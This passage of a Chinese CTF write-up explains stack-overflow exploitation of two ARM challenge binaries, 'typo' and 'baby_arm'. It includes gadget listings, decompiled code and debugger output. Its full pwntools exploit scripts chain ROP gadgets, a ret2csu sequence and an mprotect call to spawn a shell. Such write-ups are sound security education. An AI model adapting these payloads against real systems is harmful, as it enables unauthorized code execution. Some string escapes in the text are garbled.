    0x00009284 : pop {r4, r5, pc}
    0x000242e0 : pop {r4, r5, r6, fp, pc}
    0x000095b8 : pop {r4, r5, r6, pc}
    0x000212ec : pop {r4, r5, r6, r7, fp, pc}
    0x000082e8 : pop {r4, r5, r6, r7, pc}
    0x00043110 : pop {r4, r5, r6, r7, r8, fp, pc}
    0x00011648 : pop {r4, r5, r6, r7, r8, pc}
    0x00048e9c : pop {r4, r5, r6, r7, r8, sb, fp, pc}
    0x0000a5a0 : pop {r4, r5, r6, r7, r8, sb, pc}
    0x0000870c : pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
    0x00011c24 : pop {r4, r5, r6, r7, r8, sb, sl, pc}
    0x000553cc : pop {r4, r5, r6, r7, r8, sl, pc}
    0x00023ed4 : pop {r4, r5, r7, pc}
    0x00023dbc : pop {r4, r7, pc}
    0x00014068 : pop {r7, pc}
    Unique gadgets found: 29
     radish ➜ arm-pwn
可以看到有一个`pop {r0, r4, pc}`，刚好覆盖了第一个参数和`pc`，修改成`system("/bin/shx00")`即可
exp:
    from pwn import *
    # from LibcSearcher import *
    context.log_level='debug'
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    r = process("./typo", timeout = 2)
    ru("if you want to quitn")
    sl("")
    ru("n")
    ru("n")
    system_addr = 0x00110B4
    bin_sh_addr = 0x006C384
    ppp = 0x00020904#pop {r0, r4, pc}
    payload = "A"*112+p32(ppp)+p32(bin_sh_addr)+p32(0)+p32(system_addr)
    sl(payload)
    ri()
###  baby_arm
这个题是64位的
通过捣鼓环境发现在`ubuntu:18.04`上gdb没有报错，所以又在`ubuntu:18.04`配置了一下环境
    radish ➜ arm-pwn  checksec --file baby_arm
    [*] '/media/psf/Home/MyFile/ctf/arm-pwn/baby_arm'
        Arch:     aarch64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    radish ➜ arm-pwn  file baby_arm
    baby_arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped
这道题是动态链接的
在IDA里面分析程序
    __int64 sub_400818()
    {
      sub_400760();
      write(1LL, "Name:", 5LL);
      read(0LL, &unk_411068, 512LL);
      sub_4007F0();
      return 0LL;
    }
首先读入bss段上一个长度512的字符串,然后在`sub_4007F0`里面存在栈溢出
    __int64 sub_4007F0()
    {
      __int64 v1; // [xsp+10h] [xbp+10h]
      return read(0LL, &v1, 512LL);
    }
但是发现，第二次输入的字符串在ret地址的下面，所以覆盖`sub_400818`函数的返回地址
    SP   0x40007ffd60 —▸ 0x40007ffdb0 —▸ 0x40007ffdc0 ◂— 0x0
     PC   0x400810 ◂— ldp    x29, x30, [sp], #0x50
    ──────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────
     ► 0x400810        ldp    x29, x30, [sp], #0x50
       0x400814        ret    
        ↓
       0x400858        movz   w0, #0
       0x40085c        ldp    x29, x30, [sp], #0x10
       0x400860        ret    
        ↓
       0x40008656e0    bl     #0x4000879f40
        ↓
       0x4000879f40    stp    x29, x30, [sp, #-0x10]!
       0x4000879f44    adrp   x1, #0x4000999000
       0x4000879f48    movz   w3, #0x1
       0x4000879f4c    add    x1, x1, #0x5a0
       0x4000879f50    mov    x29, sp
    ──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
    00:0000│ x29 sp  0x40007ffd60 —▸ 0x40007ffdb0 —▸ 0x40007ffdc0 ◂— 0x0
    01:0008│         0x40007ffd68 —▸ 0x400858 ◂— movz   w0, #0
    02:0010│ x1      0x40007ffd70 ◂— 'aaaaaaaaan'
    03:0018│         0x40007ffd78 ◂— 0x1000000a61 /* 'an' */
    04:0020│         0x40007ffd80 —▸ 0x40007ffdb0 —▸ 0x40007ffdc0 ◂— 0x0
    05:0028│         0x40007ffd88 —▸ 0x400854 ◂— bl     #0x4007f0
    06:0030│         0x40007ffd90 —▸ 0x400868 ◂— stp    x29, x30, [sp, #-0x40]!
    07:0038│         0x40007ffd98 ◂— 0x8020080280200802
    ────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
     ► f 0           400810
    ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    Breakpoint *0x000000000400810
计算出来偏移是72，这里ROP用到的是`ret2csu`
    loc_4008AC                            ; CODE XREF: sub_400868+60↓j
                     LDR             X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器
                     MOV             X2, X22    ;将x22寄存器的内容赋给x2
                     MOV             X1, X23    ;将x23寄存器的内容赋给x1
                     MOV             W0, W24    ;将W24寄存器的内容赋给W0
                     ADD             X19, X19, #1    ;x19寄存器加一
                     BLR             X3    ；跳转到x3寄存器指向的地址
                     CMP             X19, X20    ；比较x19和x20是否相等
                     B.NE            loc_4008AC    ；如果不相等，就跳回loc_4008AC继续执行
    loc_4008CC                              ; CODE XREF: sub_400868+3C↑j
                     LDP             X19, X20, [SP,#0x10]    ;将sp+0x10,sp+0x18处的内容给x19,x20
                     LDP             X21, X22, [SP,#0x20]    ;将sp+0x20,sp+0x28处的内容给x21,x22
                     LDP             X23, X24, [SP,#0x30]    ;将sp+0x30,sp+0x38处的内容给x23,x24
                     LDP             X29, X30, [SP],#0x40    ;将sp,sp+0x8处的内容给x29,x30
                     RET
然后函数里面存在`mprotect`，我们利用`ROP`把`bss`段修改成可读可写可执行的权限，然后把`shellcode`写入里面，最后跳转到bss段即可获取到`shell`
`exp`:
    from pwn import *
    context.binary = "./baby_arm"
    context.log_level='debug'
    '''
    if local:
        p = remote("106.75.126.171","33865")
    elif debug:
        p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "baby_arm"])
    else:
        p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "baby_arm"])
    '''
    # r = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "baby_arm"])
    # r = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "baby_arm"])
    sl = lambda x : r.sendline(x)
    sd = lambda x : r.send(x)
    sla = lambda x,y : r.sendlineafter(x,y)
    rud = lambda x : r.recvuntil(x,drop=True)
    ru = lambda x : r.recvuntil(x)
    li = lambda name,x : log.info(name+':'+hex(x))
    ri = lambda  : r.interactive()
    ru("Name:")
    shellcode = asm(shellcraft.aarch64.sh())
    mprotect_point = 0x4110a0
    mprotect_plt = 0x000000000400600
    pay = shellcode + "a"*0xc+p64(mprotect_plt)
    # print len(shellcode)
    sl(pay)
    code_1 = 0x4008CC
    payload = "a"*72
    payload += p64(code_1)
    payload += p64(0)+p64(0x4008AC)
    payload += p64(0)+p64(1)#X19, X20, [SP,#0x10]
    payload += p64(mprotect_point)+p64(7)#X19, X20, [SP,#0x10]
    payload += p64(0x1000)+p64(0x000000000411000)
    payload += p64(0)+p64(0x411068)
    # gdb.attach(r,'''
    #     set architecture aarch64
    # ''')
    # raw_input()
    sl(payload)
    ri()
## 参考
[ARM汇编指令集](https://blog.csdn.net/zqixiao_09/article/details/50726544)  
[【上海市大学生网络安全大赛】pwn复现
](https://zszcr.github.io/2018/11/05/2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0/)  
[arm – ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/arm/arm_rop-zh/)